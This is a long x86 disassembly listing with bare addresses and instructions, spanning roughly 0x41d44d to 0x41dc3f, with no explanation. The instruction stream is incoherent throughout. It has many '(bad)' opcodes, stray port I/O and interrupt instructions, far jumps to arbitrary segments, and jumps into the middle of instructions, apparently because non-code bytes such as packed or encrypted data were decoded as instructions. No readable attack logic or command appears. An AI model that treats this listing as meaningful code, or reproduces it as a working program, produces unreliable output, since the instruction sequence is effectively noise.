  41d44d:	cs push 0x30681ff3
  41d453:	pop    ecx
  41d454:	dec    edi
  41d455:	(bad)  
  41d456:	jp     0x41d4d3
  41d458:	add    bl,BYTE PTR [eax-0xe3c8485]
  41d45e:	std    
  41d45f:	jmp    0x41d45f
  41d461:	or     dl,bh
  41d463:	or     DWORD PTR ds:0xcecc03d8,eax
  41d469:	repnz leave 
  41d46b:	enter  0xcbab,0xe0
  41d46f:	in     al,dx
  41d470:	in     eax,dx
  41d471:	xlat   BYTE PTR ds:[ebx]
  41d472:	cmc    
  41d473:	mov    esi,0xd2ccd7b8
  41d478:	(bad)  
  41d47a:	(bad)  
  41d47b:	call   esi
  41d47d:	fadd   QWORD PTR ds:0xd6e6d9c4
  41d483:	aad    0xe0
  41d485:	fucom  st(6)
  41d487:	call   0xaf1f9844
  41d48c:	scas   al,BYTE PTR es:[edi]
  41d48d:	loop   0x41d485
  41d48f:	jmp    0xd03ca955
  41d494:	std    
  41d495:	into   
  41d496:	jmp    0xf821d757
  41d49b:	int    0xe4
  41d49d:	add    edi,esi
  41d49f:	add    dh,dh
  41d4a1:	or     ecx,DWORD PTR [eax]
  41d4a3:	fild   DWORD PTR [edx]
  41d4a5:	iret   
  41d4a6:	in     al,0xdd
  41d4a8:	in     al,0xe7
  41d4aa:	jecxz  0x41d47c
  41d4ac:	out    0xf6,al
  41d4ae:	shl    BYTE PTR [ebx+esi*4-0x3063737],1
  41d4b5:	stc    
  41d4b6:	rcr    dl,1
  41d4b8:	in     eax,dx
  41d4b9:	shl    bh,0xd5
  41d4bc:	add    al,0xfd
  41d4be:	add    al,0x4
  41d4c0:	ret    
  41d4c1:	(bad)  
  41d4c2:	cmc    
  41d4c3:	out    dx,eax
  41d4c4:	ret    
  41d4c5:	loopne 0x41d4da
  41d4c7:	call   0xb319b476
  41d4cc:	mov    bl,0xd3
  41d4ce:	test   eax,0xf7f9e0b0
  41d4d3:	into   
  41d4d4:	dec    bl
  41d4d6:	(bad)  
  41d4d8:	loopne 0x41d4c8
  41d4da:	in     al,dx
  41d4db:	(bad)  
  41d4dc:	mov    edi,0xdff4dff6
  41d4e1:	jmp    0xcf2de3cf
  41d4e6:	int3   
  41d4e7:	push   es
  41d4e8:	mov    edi,0xb3cbbec8
  41d4ed:	in     al,dx
  41d4ee:	jecxz  0x41d4c7
  41d4f0:	fcmovne st,st(7)
  41d4f2:	fcomp  st(3)
  41d4f4:	(bad)  
  41d4f6:	loop   0x41d4f4
  41d4f8:	clc    
  41d4f9:	fcmove st,st(6)
  41d4fb:	add    eax,0x2c7babe
  41d500:	fimul  DWORD PTR [eax]
  41d502:	add    esp,ebx
  41d504:	add    bh,bh
  41d506:	add    edi,esp
  41d508:	ret    0xcbc7
  41d50b:	(bad)  
  41d50d:	mov    dl,0xf4
  41d50f:	in     eax,dx
  41d510:	jmp    0xb5b9:0xfcefd7e9
  41d517:	ret    
  41d518:	ror    ch,1
  41d51a:	ret    
  41d51b:	(bad)  
  41d51c:	icebp  
  41d51d:	clc    
  41d51e:	in     eax,0x5
  41d520:	cli    
  41d521:	mov    esi,0xca0bca
  41d526:	fist   WORD PTR [ecx]
  41d528:	(bad)  
  41d52a:	shl    cl,1
  41d52c:	icebp  
  41d52d:	mov    bl,0xf7
  41d52f:	cli    
  41d530:	lock in eax,dx
  41d532:	mov    ah,0xd2
  41d534:	mov    ah,0xe4
  41d536:	retf   0xf8ba
  41d539:	icebp  
  41d53a:	shl    ebx,0x1
  41d53d:	ret    0xe9b9
  41d540:	out    0xca,al
  41d542:	in     al,0xc5
  41d544:	add    ebx,ebx
  41d546:	por    mm0,mm4
  41d549:	loopne 0x41d4fe
  41d54b:	loopne 0x41d50f
  41d54d:	mov    dl,0xe0
  41d54f:	hlt    
  41d550:	in     al,dx
  41d551:	mov    ah,0xb7
  41d553:	mov    ebx,0xd0b8d7d2
  41d558:	mov    esp,0xdbbedad8
  41d55d:	fdivp  st(5),st
  41d55f:	rcr    dh,cl
  41d561:	(bad)  
  41d562:	(bad)  
  41d563:	jmp    0xe8b2:0x5c1e5c3
  41d56a:	leave  
  41d56b:	repnz leave 
  41d56d:	repnz int 0xd4
  41d570:	(bad)  
  41d571:	in     eax,dx
  41d572:	shl    edi,1
  41d574:	clc    
  41d575:	fcos   
  41d577:	enter  0xddf3,0xc3
  41d57b:	(bad)  
  41d57d:	rcl    ebx,cl
  41d57f:	idiv   DWORD PTR [edi+0x9f80fe4]
  41d585:	or     ecx,eax
  41d587:	or     DWORD PTR [ebp-0x114f5357],ebp
  41d58d:	stos   BYTE PTR es:[edi],al
  41d58e:	mov    ch,0xcd
  41d590:	(bad)  
  41d591:	aam    0xf7
  41d593:	stc    
  41d594:	rcl    bl,cl
  41d596:	mov    ah,0xf2
  41d598:	test   esi,0xfbedcdf0
  41d59e:	fsubrp st(1),st
  41d5a0:	stc    
  41d5a1:	inc    BYTE PTR [esi]
  41d5a3:	les    ecx,FWORD PTR [ebx]
  41d5a5:	or     DWORD PTR [eax],ecx
  41d5a7:	adc    esi,DWORD PTR [edx-0x38111656]
  41d5ad:	shl    BYTE PTR [edx-0x30242c36],0xbf
  41d5b4:	(bad)  
  41d5b5:	in     al,0xf3
  41d5b7:	fprem  
  41d5b9:	fdivrp st(2),st
  41d5bb:	(bad)  
  41d5bd:	loopne 0x41d59f
  41d5bf:	fiadd  DWORD PTR [edi]
  41d5c1:	add    al,0xbd
  41d5c3:	into   
  41d5c4:	lds    edx,FWORD PTR [ebx]
  41d5c6:	repnz dec bl
  41d5c9:	lock leave 
  41d5cb:	leave  
  41d5cc:	scas   eax,DWORD PTR es:[edi]
  41d5cd:	into   
  41d5ce:	mov    cl,0xa8
  41d5d0:	(bad)  
  41d5d1:	mov    ecx,0xe9dcbac7
  41d5d6:	stc    
  41d5d7:	std    
  41d5d8:	jecxz  0x41d599
  41d5da:	jecxz  0x41d5b6
  41d5dc:	mov    esi,0xf4c1d0da
  41d5e1:	fadd   st(5),st
  41d5e3:	or     esp,edi
  41d5e5:	in     eax,dx
  41d5e6:	retf   0xf2e0
  41d5e9:	jecxz  0x41d5af
  41d5eb:	mov    ebp,0xd6cadbad
  41d5f0:	shl    eax,0xe8
  41d5f3:	mov    edi,0xd6efbfc8
  41d5f8:	cmc    
  41d5f9:	in     al,dx
  41d5fa:	into   
  41d5fb:	mov    esp,0xe4e6e4be
  41d600:	fiadd  WORD PTR [ebx]
  41d602:	std    
  41d603:	add    al,0xce
  41d605:	(bad)  
  41d607:	fmul   st,st(3)
  41d609:	call   0xd11ea3ec
  41d60e:	in     al,0xfa
  41d610:	out    0xd0,al
  41d612:	shl    BYTE PTR [esi-0x935002d],1
  41d618:	fdivr  DWORD PTR [eax-0x8fa3d28]
  41d61e:	mov    ebp,0xcb02fec4
  41d623:	add    al,0x4
  41d625:	(bad)
  41d628:	enter  0xe7a8,0xca
  41d62c:	ror    ebp,1
  41d62e:	into   
  41d62f:	sar    dl,cl
  41d631:	inc    esi
  41d633:	jmp    0x41d633
  41d635:	mov    ecx,0x3d801ed
  41d63a:	stc    
  41d63b:	ret    
  41d63c:	shl    edx,1
  41d63e:	lock add ebx,edx
  41d641:	jmp    0xdc25cf0f
  41d646:	ror    DWORD PTR ds:0xeae1c6cd,cl
  41d64c:	out    0xf3,eax
  41d64e:	mov    dl,0xc4
  41d650:	out    0xe7,al
  41d652:	retf   0xf8ca
  41d655:	lock cli 
  41d657:	cli    
  41d658:	cld    
  41d659:	(bad)  
  41d65b:	in     eax,0xd3
  41d65d:	fdivr  st(6),st
  41d65f:	in     al,0xe7
  41d661:	xlat   BYTE PTR ds:[ebx]
  41d662:	add    al,0xc4
  41d664:	fstp   st(4)
  41d666:	fld    st(0)
  41d668:	retf   0xaec8
  41d66b:	repz loopne 0x41d65e
  41d66e:	cmc    
  41d66f:	xlat   BYTE PTR ds:[ebx]
  41d670:	fsubr  st,st(5)
  41d672:	mov    bh,0xb6
  41d674:	(bad)  
  41d675:	enter  0xbcee,0xbe
  41d679:	aad    0xc0
  41d67b:	add    dl,dl
  41d67d:	jecxz  0x41d664
  41d67f:	add    bh,bl
  41d681:	add    eax,0xcb0df5e5
  41d686:	call   0xca209564
  41d68b:	out    dx,al
  41d68c:	int    0xc1
  41d68e:	(bad)  
  41d68f:	into   
  41d690:	sar    BYTE PTR [ebx-0x36443339],1
  41d696:	int3   
  41d697:	fld    DWORD PTR [ecx]
  41d699:	cld    
  41d69a:	sar    BYTE PTR [esi-0x21fd2ffa],1
  41d6a0:	fst    st(7)
  41d6a2:	(bad)  
  41d6a3:	in     al,0xe6
  41d6a5:	jmp    0x41d683
  41d6a7:	in     eax,dx
  41d6a8:	ret    
  41d6a9:	lock mov edi,0xccd0f4a8
  41d6af:	test   al,0xec
  41d6b1:	mov    ah,0xf6
  41d6b3:	in     al,0xd8
  41d6b5:	cli    
  41d6b6:	mov    edi,0xe200e8b9
  41d6bb:	(bad)  
  41d6bc:	mul    eax
  41d6be:	or     edi,eax
  41d6c0:	fcmovu st,st(6)
  41d6c2:	push   cs
  41d6c3:	out    0xc,eax
  41d6c5:	int3   
  41d6c6:	(bad)  
  41d6c8:	ret    
  41d6c9:	rcl    ecx,0xb7
  41d6cc:	out    dx,eax
  41d6cd:	sar    bl,1
  41d6cf:	repz enter 0xf6ae,0xf9
  41d6d4:	mov    bl,0xf6
  41d6d6:	hlt    
  41d6d7:	mov    ebx,0xd6d6f7d3
  41d6dc:	loopne 0x41d6b7
  41d6de:	sar    ch,cl
  41d6e0:	leave  
  41d6e1:	or     bl,cl
  41d6e3:	aad    0xcb
  41d6e5:	or     BYTE PTR [eax],al
  41d6e7:	into   
  41d6e8:	into   
  41d6e9:	loope  0x41d6c1
  41d6eb:	cmc    
  41d6ec:	fmul   st(4),st
  41d6ee:	mov    bh,0xf0
  41d6f0:	out    dx,al
  41d6f1:	in     al,0xec
  41d6f3:	out    0xf7,al
  41d6f5:	out    dx,al
  41d6f6:	sti    
  41d6f7:	iret   
  41d6f8:	mov    edi,0xd6dddbf1
  41d6fd:	hlt    
  41d6fe:	(bad)  
  41d700:	cli    
  41d701:	fadd   QWORD PTR [esi]
  41d703:	imul   dh
  41d705:	retf   0xe5f3
  41d708:	rcr    dh,0xb0
  41d70b:	lods   eax,DWORD PTR ds:[esi]
  41d70c:	xlat   BYTE PTR ds:[ebx]
  41d70d:	ret    0xfbd5
  41d710:	out    0xf0,al
  41d712:	mov    bh,0xd8
  41d714:	out    dx,eax
  41d715:	shr    ebp,cl
  41d717:	mov    edi,0xb8ecf8ef
  41d71c:	push   ebx
  41d71e:	inc    DWORD PTR [ecx+ebp*8]
  41d721:	jmp    0x41d6e9
  41d723:	loopne 0x41d702
  41d725:	add    DWORD PTR [ebx],ecx
  41d727:	(bad)  
  41d728:	in     al,0xe8
  41d72a:	mov    esi,0xcbebd3f5
  41d72f:	aad    0xe6
  41d731:	enter  0xb5f7,0xf2
  41d735:	repz mov esp,0xe3ecf0f3
  41d73b:	ror    ch,0xc5
  41d73e:	(bad)
  41d741:	jecxz  0x41d741
  41d743:	or     eax,0x11202da
  41d748:	rol    ebx,0xbe
  41d74b:	shl    DWORD PTR [ebx-0x38121a29],1
  41d751:	retf   0xeef3
  41d754:	mov    ecx,0xe3d7bdf0
  41d759:	mov    ecx,0xf7fbe2ee
  41d75e:	mov    DWORD PTR [edi],0xdbcad8f7
  41d764:	aad    0xf9
  41d766:	enter  0xef08,0xf7
  41d76a:	iret   
  41d76b:	(bad)  
  41d76d:	jecxz  0x41d751
  41d76f:	iret   
  41d770:	mov    al,0xd0
  41d772:	lock fcmovbe st,st(0)
  41d775:	fnop   
  41d777:	aad    0x2
  41d779:	(bad)  
  41d77a:	cmc    
  41d77b:	out    dx,al
  41d77c:	faddp  st(4),st
  41d77e:	repnz (bad) 
  41d780:	loop   0x41d778
  41d782:	(bad)  
  41d784:	std    
  41d785:	fndisi(8087 only) 
  41d787:	jmp    0xe8ef:0xb1f6cab9
  41d78e:	enter  0xf5ed,0xef
  41d792:	push   ecx
  41d794:	in     al,dx
  41d795:	mov    dl,0xbe
  41d797:	xlat   BYTE PTR ds:[ebx]
  41d798:	fcmovu st,st(1)
  41d79a:	in     eax,dx
  41d79b:	test   eax,0xdfeaf5c3
  41d7a1:	pmulhuw mm4,mm7
  41d7a4:	or     eax,0xcaede4e7
  41d7a9:	mov    esi,0xf5c2e4ea
  41d7ae:	in     eax,0xb2
  41d7b0:	fcmove st,st(3)
  41d7b2:	into   
  41d7b3:	fdivr  st,st(1)
  41d7b5:	leave  
  41d7b6:	aad    0x1
  41d7b8:	icebp  
  41d7b9:	add    eax,eax
  41d7bb:	loop   0x41d790
  41d7bd:	mov    dl,0xda
  41d7c0:	mov    dl,0xef
  41d7c3:	add    eax,DWORD PTR [eax]
  41d7c5:	ret    0x2cd
  41d7c8:	lods   eax,DWORD PTR ds:[esi]
  41d7c9:	out    dx,eax
  41d7ca:	ror    ebp,1
  41d7cc:	lock mov dl,0xe3
  41d7cf:	loop   0x41d7a0
  41d7d1:	loopne 0x41d78c
  41d7d3:	clc    
  41d7d4:	aam    0xd4
  41d7d6:	(bad)  
  41d7d8:	(bad)  
  41d7d9:	out    dx,al
  41d7da:	rcr    ecx,1
  41d7dc:	in     al,dx
  41d7dd:	add    ecx,esp
  41d7df:	add    esi,esp
  41d7e1:	add    BYTE PTR [eax],cl
  41d7e3:	fstp   st(2)
  41d7e5:	fcomp  st(6)
  41d7e7:	or     ch,bl
  41d7e9:	mov    cl,0xd1
  41d7eb:	repnz stos DWORD PTR es:[edi],eax
  41d7ed:	hlt    
  41d7ee:	int    0xe5
  41d7f0:	mov    al,0xcb
  41d7f2:	retf   0xd1ff
  41d7f5:	int3   
  41d7f6:	in     al,dx
  41d7f7:	cli    
  41d7f8:	iret   
  41d7f9:	aam    0xf0
  41d7fb:	repz icebp 
  41d7fd:	push   es
  41d7fe:	mov    ebp,0xe2c4f7c2
  41d803:	jmp    0xcfbe:0xecee03e3
  41d80a:	not    esi
  41d80c:	mov    bh,0xb0
  41d80e:	sti    
  41d80f:	jmp    0x41d801
  41d811:	shl    ah,1
  41d813:	(bad)  
  41d814:	lock rol DWORD PTR [ebx],cl
  41d817:	cmc    
  41d818:	(bad)  
  41d81a:	aam    0xf4
  41d81c:	hlt    
  41d81d:	lock add eax,esi
  41d820:	push   es
  41d821:	cmc    
  41d822:	div    esi
  41d824:	loop   0x41d7eb
  41d826:	pop    es
  41d827:	add    ecx,edi
  41d829:	int3   
  41d82a:	fcomip st,st(3)
  41d82c:	retf   0xeace
  41d82f:	mov    ch,0xf0
  41d831:	out    dx,al
  41d832:	cli    
  41d833:	in     eax,0xba
  41d835:	mov    ebp,0xbd03d1bc
  41d83a:	mov    eax,0xd6ec04c7
  41d83f:	out    0xdb,eax
  41d841:	add    al,0x8
  41d843:	(bad)  
  41d844:	(bad)  
  41d845:	jecxz  0x41d808
  41d847:	repz mov dl,0xc0
  41d84a:	shl    esp,cl
  41d84c:	in     eax,0xaa
  41d84e:	rcl    cl,0xc4
  41d851:	in     eax,0xd9
  41d853:	lock jmp 0x41d821
  41d856:	mov    esp,0xcef2b8b4
  41d85b:	out    0xf4,al
  41d85d:	clc    
  41d85e:	(bad)  
  41d860:	cld    
  41d861:	mov    esi,0x3e8f9d5
  41d866:	out    dx,eax
  41d867:	jmp    0xed0fbb29
  41d86c:	into   
  41d86d:	sti    
  41d86e:	rol    bh,cl
  41d870:	out    0xf7,al
  41d872:	retf   0xcff6
  41d875:	cld    
  41d876:	mov    eax,0xcfdbc2
  41d87b:	(bad)  
  41d87d:	ret    
  41d87e:	fst    st(7)
  41d880:	(bad)  
  41d882:	add    eax,0xd9e903ee
  41d887:	push   es
  41d888:	into   
  41d889:	ret    0xe8c4
  41d88c:	scas   eax,DWORD PTR es:[edi]
  41d88d:	shl    BYTE PTR [ebp-0x31380654],1
  41d893:	mov    bh,0xdd
  41d895:	cli    
  41d896:	(bad)  
  41d898:	leave  
  41d899:	fdivrp st(2),st
  41d89b:	in     eax,0x6
  41d89d:	mov    esp,0xdfd90103
  41d8a2:	pop    es
  41d8a3:	cli    
  41d8a4:	(bad)  
  41d8a5:	fdivp  st(2),st
  41d8a7:	std    
  41d8a8:	out    0xcf,eax
  41d8aa:	scas   al,BYTE PTR es:[edi]
  41d8ab:	fsubrp st(5),st
  41d8ad:	leave  
  41d8ae:	lods   al,BYTE PTR ds:[esi]
  41d8af:	enter  0xcccf,0xce
  41d8b3:	(bad)  
  41d8b4:	retf   0xd5eb
  41d8b7:	mov    esp,0xdcc8df
  41d8bc:	ret    0xd5ba
  41d8bf:	jmp    0xca:0xd4efd6de
  41d8c6:	jmp    0xae21bfc9
  41d8cb:	int    0xc5
  41d8cd:	jmp    0xe01c8ac3
  41d8d2:	stc    
  41d8d3:	sar    edx,1
  41d8d5:	aam    0xf4
  41d8d7:	retf   0xd403
  41d8da:	loopne 0x41d8a3
  41d8dc:	(bad)  
  41d8dd:	jmp    0x41d8bf
  41d8df:	fld    st(4)
  41d8e1:	out    0xef,eax
  41d8e3:	clc    
  41d8e4:	or     al,0xfc
  41d8e6:	iret   
  41d8e7:	call   0xb115b59d
  41d8ec:	mov    cl,0xef
  41d8ee:	(bad)  
  41d8f0:	repz mov bh,0xb5
  41d8f3:	cmc    
  41d8f4:	mov    ecx,0xc1cdf7fe
  41d8f9:	fcmovne st,st(6)
  41d8fb:	lock (bad) 
  41d8fe:	ret    
  41d8ff:	cmc    
  41d900:	fucomip st,st(0)
  41d902:	or     edi,ecx
  41d904:	loop   0x41d900
  41d906:	cld    
  41d907:	jmp    0x41d8fc
  41d909:	in     al,dx
  41d90a:	int3   
  41d90b:	in     al,0xc3
  41d90d:	jmp    0x41d903
  41d90f:	rcl    eax,0xf7
  41d912:	(bad)  
  41d914:	jmp    0xc003:0xbed4d9ff
  41d91b:	ror    ebp,0xba
  41d91e:	(bad)  
  41d91f:	loope  0x41d8eb
  41d921:	enter  0xc7e6,0xf9
  41d925:	iret   
  41d926:	(bad)  
  41d928:	jecxz  0x41d8d3
  41d92a:	mov    esp,0xd2c3efb2
  41d92f:	int    0xca
  41d931:	in     eax,0xf8
  41d933:	in     eax,0xb3
  41d935:	mov    ecx,0xbdf9eadc
  41d93a:	cmc    
  41d93b:	pop    es
  41d93c:	loopne 0x41d8fe
  41d93e:	retf   
  41d93f:	std    
  41d940:	fsubr  st(4),st
  41d942:	in     eax,0xf9
  41d944:	jmp    0x41d929
  41d946:	jmp    0xacce:0xefc7b10d
  41d94d:	lods   al,BYTE PTR ds:[esi]
  41d94e:	ret    
  41d94f:	(bad)  
  41d950:	cmc    
  41d951:	bnd jmp 0x41d908
  41d954:	in     al,0xbf
  41d956:	mov    cl,0xd5
  41d958:	fcomip st,st(0)
  41d95a:	ret    
  41d95b:	loopne 0x41d953
  41d95d:	cld    
  41d95e:	out    0xdc,al
  41d960:	ret    
  41d961:	retf   0xe204
  41d964:	(bad)  
  41d965:	adc    ebp,eax
  41d967:	int3   
  41d968:	enter  0xcecb,0xec
  41d96c:	lock out dx,al
  41d96e:	jmp    0x41d931
  41d970:	out    0xb1,al
  41d972:	aad    0xcf
  41d974:	into   
  41d975:	mov    ecx,0xecf0b9f1
  41d97a:	fst    st(0)
  41d97c:	in     eax,0xfb
  41d97e:	mov    esp,0xf50fc7e6
  41d983:	(bad)  
  41d984:	in     al,0xfe
  41d986:	jmp    0xd1e5:0xececc0e9
  41d98d:	iret   
  41d98e:	rcl    eax,cl
  41d990:	in     eax,dx
  41d991:	in     al,0xee
  41d993:	clc    
  41d994:	jmp    0xb8c2:0xedfdeee4
  41d99b:	repz (bad) 
  41d99e:	or     edi,DWORD PTR [eax-0x1a10242b]
  41d9a4:	(bad)  
  41d9a6:	cli    
  41d9a7:	or     ebx,edx
  41d9a9:	mov    edi,0xace6b2e3
  41d9ae:	cmc    
  41d9af:	stc    
  41d9b0:	jmp    0xc5fbc9a9
  41d9b5:	fxch   st(7)
  41d9b7:	rcl    eax,1
  41d9b9:	hlt    
  41d9ba:	mov    ebp,0xe406f0be
  41d9bf:	add    eax,0xe7dfeafa
  41d9c4:	out    0xe4,al
  41d9c6:	fstp   st(4)
  41d9c8:	loope  0x41d9b4
  41d9ca:	into   
  41d9cb:	lods   eax,DWORD PTR ds:[esi]
  41d9cc:	out    dx,eax
  41d9cd:	(bad)  
  41d9ce:	repz enter 0xcbd4,0xf7
  41d9d3:	(bad)  
  41d9d5:	fcmovu st,st(0)
  41d9d7:	cmc    
  41d9d8:	rcl    ch,1
  41d9da:	loopne 0x41d9d5
  41d9dc:	clc    
  41d9dd:	loopne 0x41d9d1
  41d9df:	ror    DWORD PTR [ecx],0x6
  41d9e2:	(bad)  
  41d9e3:	out    0xb,al
  41d9e5:	leave  
  41d9e6:	int3   
  41d9e7:	loope  0x41d9a7
  41d9e9:	test   eax,0xe3f5c8b2
  41d9ee:	aam    0xd5
  41d9f0:	mov    ecx,0xfeb0bbb0
  41d9f5:	mov    ah,0xde
  41d9f7:	iret   
  41d9f8:	fdivrp st(1),st
  41d9fa:	mov    ecx,0xcbc606d0
  41d9ff:	jmp    0x41d9ea
  41da01:	aam    0xfe
  41da03:	lds    eax,FWORD PTR [ecx]
  41da05:	add    ebp,esp
  41da07:	iret   
  41da08:	mov    cl,0xc1
  41da0a:	mov    edi,0xe4d0c0e9
  41da0f:	hlt    
  41da10:	out    0xba,eax
  41da12:	xlat   BYTE PTR ds:[ebx]
  41da13:	out    dx,eax
  41da14:	mov    ah,0xf1
  41da16:	add    dl,ch
  41da18:	(bad)  
  41da1a:	aad    0xf0
  41da1c:	shl    ch,0xd1
  41da1f:	cld    
  41da20:	cld    
  41da21:	or     eax,DWORD PTR [ecx]
  41da23:	retf   0x9df
  41da26:	fild   DWORD PTR [ecx+eiz*8]
  41da29:	mov    edi,0xd4ccb7c0
  41da2e:	leave  
  41da2f:	(bad)  
  41da30:	fisubr DWORD PTR [esi-0x222e0830]
  41da36:	mov    cl,0xe9
  41da38:	ret    0xcff8
  41da3b:	fcmovnbe st,st(1)
  41da3d:	(bad)  
  41da3e:	clc    
  41da3f:	(bad)  
  41da41:	cmc    
  41da42:	add    al,0xe5
  41da44:	in     al,dx
  41da45:	loope  0x41da29
  41da47:	into   
  41da48:	fsubr  QWORD PTR [eax-0x1748123e]
  41da4e:	out    dx,eax
  41da4f:	in     al,0xf4
  41da51:	retf   0xcaf4
  41da54:	cmc    
  41da55:	(bad)  
  41da56:	in     al,dx
  41da57:	jmp    0x404:0xd4fbb9de
  41da5e:	sti    
  41da5f:	out    0xe5,eax
  41da61:	xlat   BYTE PTR ds:[ebx]
  41da62:	jmp    0x41da66
  41da64:	(bad)  
  41da66:	into   
  41da67:	or     ebp,DWORD PTR [ebp+ecx*8-0x8101053]
  41da6e:	in     al,dx
  41da6f:	mov    ah,0xba
  41da71:	(bad)  
  41da73:	(bad)  
  41da74:	out    dx,eax
  41da75:	mov    eax,0x703f8f0
  41da7a:	ret    
  41da7b:	icebp  
  41da7c:	shl    ch,1
  41da7e:	add    edi,ecx
  41da80:	or     ebp,ecx
  41da82:	add    eax,0xdc0502da
  41da87:	fldl2e 
  41da89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da8a:	mov    edi,0xe8cbcdcb
  41da8f:	out    0xea,eax
  41da91:	cmc    
  41da92:	mov    eax,0xe9bcf6f3
  41da97:	fmulp  st(4),st
  41da99:	stc    
  41da9a:	cmc    
  41da9b:	add    bh,cl
  41da9d:	fcom   st(1)
  41da9f:	repnz retf 
  41daa1:	test   bl,0xd6
  41daa4:	(bad)  
  41daa6:	out    dx,al
  41daa7:	les    esi,FWORD PTR [ecx-0x312a381a]
  41daad:	sar    DWORD PTR [ebx-0x38262e58],0xd9
  41dab4:	aad    0xdf
  41dab6:	std    
  41dab7:	aad    0xfd
  41dab9:	fidivr WORD PTR [edi-0x2d220d0c]
  41dabf:	aad    0xe0
  41dac1:	xlat   BYTE PTR ds:[ebx]
  41dac2:	mov    ah,0xe1
  41dac5:	or     ecx,DWORD PTR [edi]
  41dac7:	pmulhw mm6,QWORD PTR [ecx-0x3c350911]
  41dace:	icebp  
  41dacf:	ret    0xdfe1
  41dad2:	in     al,0xb9
  41dad4:	div    edx
  41dad6:	lock add edx,esp
  41dad9:	cli    
  41dada:	int3   
  41dadb:	sar    edi,0xc6
  41dade:	ret    0xd503
  41dae1:	enter  0xffa,0xea
  41dae5:	pop    es
  41dae6:	jecxz  0x41dafb
  41dae8:	scas   al,BYTE PTR es:[edi]
  41dae9:	in     al,dx
  41daea:	repz shl esi,cl
  41daed:	xlat   BYTE PTR ds:[ebx]
  41daee:	repnz icebp 
  41daf0:	in     al,dx
  41daf1:	mov    ebx,0xf7e4f6e9
  41daf6:	leave  
  41daf7:	into   
  41daf8:	shl    ecx,1
  41dafa:	(bad)  
  41dafb:	stc    
  41dafc:	(bad)  
  41dafe:	(bad)  
  41daff:	(bad)  
  41db00:	cld    
  41db01:	loope  0x41dac0
  41db03:	enter  0xe5d4,0xc9
  41db07:	f2xm1  
  41db09:	mov    edi,0xe8ceb7b2
  41db0e:	mov    cl,0xc7
  41db10:	(bad)  
  41db11:	mov    eax,0xf4bfb5e4
  41db16:	sar    ah,1
  41db18:	icebp  
  41db19:	sar    ecx,0xd8
  41db1c:	rol    DWORD PTR [esp+edx*8],1
  41db1f:	in     al,0xdb
  41db21:	loope  0x41db29
  41db23:	add    al,0x4
  41db25:	hlt    
  41db26:	retf   
  41db27:	loope  0x41daf3
  41db29:	rcr    ebp,cl
  41db2b:	loope  0x41dafb
  41db2d:	leave  
  41db2e:	imul   esi
  41db30:	iret   
  41db31:	fcmovnu st,st(3)
  41db33:	call   0xce37df2d
  41db38:	jecxz  0x41dafd
  41db3a:	mov    ch,0xfa
  41db3c:	lock loop 0x41db00
  41db3f:	hlt    
  41db40:	add    al,0x3
  41db42:	pop    es
  41db43:	test   BYTE PTR [edi],0x13
  41db46:	add    eax,0xdecface2
  41db4b:	mov    esi,0xb7b7e6f6
  41db50:	mov    bh,0xfb
  41db52:	jmp    0x41db45
  41db54:	fcomi  st,st(0)
  41db56:	(bad)  
  41db57:	mov    edi,0xdaece2cc
  41db5c:	std    
  41db5d:	add    eax,0xca08d9f2
  41db62:	cmc    
  41db63:	jmp    0xbce9:0xe8fffb0d
  41db6a:	rcl    esi,0xe2
  41db6d:	loopne 0x41db2f
  41db6f:	iret   
  41db70:	loopne 0x41db3b
  41db72:	into   
  41db73:	retf   
  41db74:	mov    ebp,0xeebcf0ba
  41db79:	rcr    ecx,0xc7
  41db7c:	rcr    edi,0xd1
  41db7f:	rol    BYTE PTR [edi],cl
  41db81:	loopne 0x41db4b
  41db83:	add    al,0xc9
  41db85:	sti    
  41db86:	loop   0x41db99
  41db88:	in     eax,0xf0
  41db8a:	jmp    0xeb37c753
  41db8f:	(bad)  
  41db90:	div    cl
  41db92:	lods   eax,DWORD PTR ds:[esi]
  41db93:	fmul   st,st(3)
  41db95:	mov    dl,0xf0
  41db97:	int    0xe3
  41db99:	into   
  41db9a:	add    bl,ah
  41db9c:	loopne 0x41db7a
  41db9e:	lock cld 
  41dba0:	(bad)
  41dba3:	(bad)  
  41dba4:	in     eax,dx
  41dba5:	jmp    0x41db89
  41dba7:	add    edi,ecx
  41dba9:	mov    esp,0xbcf3d6ae
  41dbae:	ret    0xb3c5
  41dbb1:	int    0xf7
  41dbb3:	shr    dh,1
  41dbb5:	int3   
  41dbb6:	add    edi,DWORD PTR [eax-0x8430c14]
  41dbbc:	in     al,0xe1
  41dbbe:	fadd   QWORD PTR [ecx]
  41dbc0:	icebp  
  41dbc1:	or     DWORD PTR [edx],eax
  41dbc3:	les    eax,FWORD PTR ds:0xd011dc13
  41dbc9:	shr    BYTE PTR [esi-0x29195242],0xe7
  41dbd0:	call   0xfb37979c
  41dbd5:	repz jecxz 0x41dbb2
  41dbd8:	loop   0x41dbd0
  41dbda:	(bad)  
  41dbdb:	aam    0xd1
  41dbdd:	ret    
  41dbde:	repnz jmp 0xd4e9:0xe2e5caf9
  41dbe6:	ror    ebx,cl
  41dbe8:	scas   eax,DWORD PTR es:[edi]
  41dbe9:	(bad)  
  41dbea:	leave  
  41dbeb:	shl    dh,cl
  41dbed:	shl    ecx,cl
  41dbef:	mov    bl,0xe1
  41dbf1:	(bad)  
  41dbf2:	in     eax,dx
  41dbf3:	(bad)  
  41dbf5:	jmp    0xf6e3:0xe1c3e9f4
  41dbfc:	stc    
  41dbfd:	(bad)  
  41dbff:	(bad)  
  41dc00:	loopne 0x41dbe1
  41dc02:	pop    es
  41dc03:	add    bh,al
  41dc05:	jmp    0x41dc0b
  41dc07:	cli    
  41dc08:	iret   
  41dc09:	ror    bh,1
  41dc0b:	jmp    0x41dc03
  41dc0d:	in     al,0xdb
  41dc0f:	mov    bl,0xcd
  41dc11:	scas   al,BYTE PTR es:[edi]
  41dc12:	lods   eax,DWORD PTR ds:[esi]
  41dc13:	aad    0xd6
  41dc15:	rcr    al,1
  41dc17:	sti    
  41dc18:	leave  
  41dc19:	fnclex 
  41dc1b:	jecxz  0x41dbf4
  41dc1d:	add    eax,0xc4c2c0da
  41dc22:	iret   
  41dc23:	(bad)  
  41dc24:	or     ah,al
  41dc26:	jecxz  0x41dc12
  41dc28:	out    dx,al
  41dc29:	mov    esp,0xd0cbcfdc
  41dc2e:	in     eax,dx
  41dc2f:	retf   
  41dc30:	int3   
  41dc31:	sti    
  41dc32:	int3   
  41dc33:	(bad)
  41dc36:	jmp    0xbe15d018
  41dc3b:	add    edi,esi
  41dc3d:	out    0xd3,al
  41dc3f:	jmp    0x6d5:0xd9fbe6f1
